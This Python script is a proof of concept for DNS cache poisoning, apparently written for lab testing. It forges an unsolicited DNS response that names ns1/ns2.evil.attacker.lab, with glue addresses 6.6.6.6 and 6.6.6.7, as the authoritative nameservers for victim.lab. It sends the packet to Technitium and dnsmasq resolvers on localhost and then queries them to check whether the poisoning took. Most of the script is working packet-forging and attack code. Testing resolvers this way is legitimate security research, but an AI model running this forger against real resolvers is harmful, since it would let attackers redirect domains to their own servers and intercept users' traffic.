#!/usr/bin/env python3
"""
PoC: Unsolicited DNS Response — Authority NS RDATA Cache Poisoning

Based on the attack described in b_results/Spoofed_Response_Authority_NS_RDATA_response.txt.

Attack idea:
  Send a forged DNS response (QR=1) directly to the target resolver where:
  - There is no matching outstanding query (the resolver never asked for it)
  - Transaction ID is arbitrary (4242)
  - Authority carries malicious NS: victim.lab → ns1.evil.attacker.lab
  - Additional carries malicious glue: ns1.evil.attacker.lab → 6.6.6.6

Mapped to this lab:
  - example.com → victim.lab (victim zone)
  - attacker.net → evil.attacker.lab (attacker NS names)
  - Target 1: Technitium (127.0.0.1:5320)
  - Target 2: dnsmasq (127.0.0.1:5322)

Verification:
  After sending the PoC, query victim.lab NS and see whether it shows ns1.evil.attacker.lab.
"""

import socket
import struct
import sys
import time


def encode_dns_name(name: str) -> bytes:
    """Encode a domain name to DNS wire format (label sequence)."""
    result = b""
    for label in name.rstrip(".").split("."):
        encoded = label.encode("ascii")
        result += struct.pack("!B", len(encoded)) + encoded
    result += b"\x00"
    return result


def build_spoofed_response() -> bytes:
    """
    Build the malicious DNS response packet described in the PoC.

    Header:  ID=4242, QR=1, AA=1, RD=1, RA=1, RCODE=0
             QDCOUNT=1, ANCOUNT=0, NSCOUNT=2, ARCOUNT=2
    Question: www.victim.lab A IN
    Authority: victim.lab NS ns1.evil.attacker.lab
               victim.lab NS ns2.evil.attacker.lab
    Additional: ns1.evil.attacker.lab A 6.6.6.6
                ns2.evil.attacker.lab A 6.6.6.7
    """

    # --- Header ---
    tx_id = 4242
    # Flags: QR=1, Opcode=0, AA=1, TC=0, RD=1, RA=1, Z=0, RCODE=0
    # QR(1) | Opcode(4) | AA(1) | TC(1) | RD(1) | RA(1) | Z(3) | RCODE(4)
    # 1 0000 1 0 1   1 000 0000
    # = 0x8580
    flags = 0x8580
    qdcount = 1
    ancount = 0
    nscount = 2
    arcount = 2

    header = struct.pack("!HHHHHH", tx_id, flags, qdcount, ancount, nscount, arcount)

    # --- Question Section ---
    qname = encode_dns_name("www.victim.lab")
    qtype = 1    # A
    qclass = 1   # IN
    question = qname + struct.pack("!HH", qtype, qclass)

    # --- Authority Section ---
    def make_ns_rr(owner: str, nsdname: str, ttl: int = 86400) -> bytes:
        name_wire = encode_dns_name(owner)
        rdata = encode_dns_name(nsdname)
        # TYPE=NS(2), CLASS=IN(1), TTL, RDLENGTH, RDATA
        return name_wire + struct.pack("!HHIH", 2, 1, ttl, len(rdata)) + rdata

    auth1 = make_ns_rr("victim.lab", "ns1.evil.attacker.lab")
    auth2 = make_ns_rr("victim.lab", "ns2.evil.attacker.lab")

    # --- Additional Section ---
    def make_a_rr(owner: str, ip: str, ttl: int = 86400) -> bytes:
        name_wire = encode_dns_name(owner)
        ip_bytes = socket.inet_aton(ip)
        # TYPE=A(1), CLASS=IN(1), TTL, RDLENGTH=4, RDATA
        return name_wire + struct.pack("!HHIH", 1, 1, ttl, 4) + ip_bytes

    add1 = make_a_rr("ns1.evil.attacker.lab", "6.6.6.6")
    add2 = make_a_rr("ns2.evil.attacker.lab", "6.6.6.7")

    return header + question + auth1 + auth2 + add1 + add2


def send_to_target(target_ip: str, target_port: int, payload: bytes, label: str):
    """Send the forged response to the resolver over UDP."""
    print(f"\n{'='*60}")
    print(f"Target: {label} ({target_ip}:{target_port})")
    print(f"{'='*60}")
    print(f"  Sending forged DNS response (QR=1, ID=4242)")
    print(f"  Question: www.victim.lab A")
    print(f"  Authority: victim.lab NS ns1.evil.attacker.lab")
    print(f"             victim.lab NS ns2.evil.attacker.lab")
    print(f"  Additional: ns1.evil.attacker.lab A 6.6.6.6")
    print(f"              ns2.evil.attacker.lab A 6.6.6.7")
    print(f"  Packet size: {len(payload)} bytes")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    try:
        sock.sendto(payload, (target_ip, target_port))
        print(f"  [sent] forged response to {target_ip}:{target_port}")
    except Exception as e:
        print(f"  [error] send failed: {e}")
    finally:
        sock.close()


def query_and_check(target_ip: str, target_port: int, qname: str, qtype: int, label: str) -> str:
    """Send a normal DNS query and return the raw response."""
    # Build query
    tx_id = 0x1234
    flags = 0x0100  # RD=1
    header = struct.pack("!HHHHHH", tx_id, flags, 1, 0, 0, 0)
    question = encode_dns_name(qname) + struct.pack("!HH", qtype, 1)
    query = header + question

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    try:
        sock.sendto(query, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        return data
    except socket.timeout:
        return None
    finally:
        sock.close()


def parse_response_brief(data: bytes, label: str):
    """Parse a DNS response briefly and print key sections."""
    if data is None:
        print(f"  [timeout] no response")
        return False

    if len(data) < 12:
        print(f"  [error] response too short ({len(data)} bytes)")
        return False

    tx_id, flags, qdcount, ancount, nscount, arcount = struct.unpack("!HHHHHH", data[:12])
    rcode = flags & 0x0F
    aa = (flags >> 10) & 1

    rcode_names = {0: "NOERROR", 1: "FORMERR", 2: "SERVFAIL", 3: "NXDOMAIN", 5: "REFUSED"}
    rcode_str = rcode_names.get(rcode, f"RCODE={rcode}")

    print(f"  Response: {rcode_str}, AA={aa}, ANSWER={ancount}, AUTHORITY={nscount}, ADDITIONAL={arcount}")

    # Walk all RRs to detect malicious NS
    raw = data[12:]
    poisoned = False

    try:
        # Skip Question
        for _ in range(qdcount):
            raw, _ = skip_name(raw)
            raw = raw[4:]  # QTYPE + QCLASS

        # Answer + Authority + Additional
        for section_name, count in [("ANSWER", ancount), ("AUTHORITY", nscount), ("ADDITIONAL", arcount)]:
            for _ in range(count):
                raw, rr_name = read_name_from_packet(data, len(data) - len(raw))
                offset_in_raw = len(data) - len(raw)
                rr_type, rr_class, rr_ttl, rdlen = struct.unpack("!HHIH", raw[:10])
                rdata_raw = raw[10:10+rdlen]
                raw = raw[10+rdlen:]

                type_names = {1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 28: "AAAA"}
                type_str = type_names.get(rr_type, f"TYPE{rr_type}")

                if rr_type == 2:  # NS
                    _, ns_name = read_name_from_packet(data, offset_in_raw + 10)
                    print(f"    {section_name}: {rr_name} {type_str} {ns_name} (TTL={rr_ttl})")
                    if "evil" in ns_name.lower():
                        poisoned = True
                        print(f"    ⚠️  Malicious NS detected — cache may be poisoned!")
                elif rr_type == 1:  # A
                    if rdlen == 4:
                        ip = socket.inet_ntoa(rdata_raw)
                        print(f"    {section_name}: {rr_name} {type_str} {ip} (TTL={rr_ttl})")
                else:
                    print(f"    {section_name}: {rr_name} {type_str} (TTL={rr_ttl})")
    except Exception:
        pass

    return poisoned


def skip_name(raw: bytes):
    """Skip over a DNS name without fully parsing it."""
    pos = 0
    while True:
        if pos >= len(raw):
            break
        length = raw[pos]
        if length == 0:
            pos += 1
            break
        if (length & 0xC0) == 0xC0:
            pos += 2
            break
        pos += 1 + length
    return raw[pos:], ""


def read_name_from_packet(packet: bytes, offset: int) -> tuple:
    """Read a DNS name from packet at offset (supports name compression)."""
    labels = []
    visited = set()
    original_offset = offset
    jumped = False
    bytes_consumed = 0

    while True:
        if offset in visited or offset >= len(packet):
            break
        visited.add(offset)

        length = packet[offset]
        if length == 0:
            if not jumped:
                bytes_consumed = offset - original_offset + 1
            offset += 1
            break
        elif (length & 0xC0) == 0xC0:
            if not jumped:
                bytes_consumed = offset - original_offset + 2
                jumped = True
            pointer = struct.unpack("!H", packet[offset:offset+2])[0] & 0x3FFF
            offset = pointer
        else:
            offset += 1
            label = packet[offset:offset+length].decode("ascii", errors="replace")
            labels.append(label)
            offset += length

    name = ".".join(labels) + "." if labels else "."

    if not jumped:
        bytes_consumed = offset - original_offset

    return (packet[original_offset + bytes_consumed:] if not jumped else packet[original_offset + bytes_consumed:]), name


def main():
    payload = build_spoofed_response()

    targets = [
        ("127.0.0.1", 5320, "Technitium"),
        ("127.0.0.1", 5322, "dnsmasq"),
    ]

    print("=" * 60)
    print(" PoC: Unsolicited DNS Response — Authority NS RDATA")
    print(" Based on Spoofed_Response_Authority_NS_RDATA_response.txt")
    print("=" * 60)

    # Phase 1: query victim.lab NS before attack (baseline)
    print("\n" + "=" * 60)
    print(" Phase 1: Before attack — baseline victim.lab NS")
    print("=" * 60)
    for ip, port, name in targets:
        print(f"\n  [{name}] query victim.lab NS:")
        resp = query_and_check(ip, port, "victim.lab", 2, name)  # NS=2
        parse_response_brief(resp, name)

    # Phase 2: send forged response
    print("\n" + "=" * 60)
    print(" Phase 2: Send forged DNS response (unsolicited)")
    print("=" * 60)
    for ip, port, name in targets:
        send_to_target(ip, port, payload, name)

    time.sleep(2)

    # Phase 3: query victim.lab NS after attack
    print("\n" + "=" * 60)
    print(" Phase 3: After attack — victim.lab NS (poisoning check)")
    print("=" * 60)
    any_poisoned = False
    for ip, port, name in targets:
        print(f"\n  [{name}] query victim.lab NS:")
        resp = query_and_check(ip, port, "victim.lab", 2, name)
        if parse_response_brief(resp, name):
            any_poisoned = True

    # Phase 4: extra check — www.victim.lab A for hijack signs
    print("\n" + "=" * 60)
    print(" Phase 4: Extra check — query www.victim.lab A")
    print("=" * 60)
    for ip, port, name in targets:
        print(f"\n  [{name}] query www.victim.lab A:")
        resp = query_and_check(ip, port, "www.victim.lab", 1, name)
        if parse_response_brief(resp, name):
            any_poisoned = True

    # Summary
    print("\n" + "=" * 60)
    if any_poisoned:
        print(" ⚠️  Conclusion: cache poisoning observed — vulnerable.")
    else:
        print(" ✅ Conclusion: no cache poisoning detected. Both targets dropped the")
        print("    unsolicited forged DNS response as expected.")
    print("=" * 60)


if __name__ == "__main__":
    main()
